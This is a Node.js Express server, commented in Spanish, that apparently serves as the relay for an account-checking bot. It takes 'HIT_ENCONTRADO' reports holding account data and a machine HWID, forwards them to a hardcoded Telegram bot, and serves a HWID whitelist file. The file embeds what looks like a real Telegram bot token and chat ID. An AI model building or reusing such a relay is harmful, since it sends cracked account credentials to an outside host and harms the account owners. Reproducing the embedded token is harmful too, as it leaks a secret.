const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

// IMPORTANTE: Esto permite que el servidor lea los datos que envía el bot
app.use(express.json());

const TELEGRAM_TOKEN = '8753363173:AAETIidwUu0M1hPYXOGPswuvBclTsRnVZ6g';
const MI_CHAT_ID = '7503721625';

async function enviarTelegram(mensaje) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: MI_CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown'
        });
        console.log("✅ Mensaje enviado a Telegram");
    } catch (e) {
        console.log("❌ Error en Telegram:", e.response ? e.response.data : e.message);
    }
}

app.get('/lista_blanca.txt', (req, res) => {
    res.sendFile(path.join(__dirname, 'lista_blanca.txt'));
});

app.post('/api/v1/sync', async (req, res) => {
    // Log para ver en Render qué está llegando
    console.log("📥 Datos recibidos del bot:", req.body);

    const { tipo, hwid, data, fecha } = req.body;

    let mensajeTelegram = "";
    if (tipo === "HIT_ENCONTRADO") {
        mensajeTelegram = `🔥 *¡NUEVO HIT DETECTADO!* 🔥\n\n👤 *Cuenta:* \`${data}\`\n🆔 *PC:* ${hwid}\n📅 *Fecha:* ${fecha}`;
    } else {
        mensajeTelegram = `⚠️ *AVISO:* ${tipo}\n🆔 *HWID:* ${hwid}\n📝 *Info:* ${data}`;
    }

    await enviarTelegram(mensajeTelegram);
    res.status(200).send("OK");
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log("🚀 Servidor Maestro Titán Online y vinculado a Telegram");
});
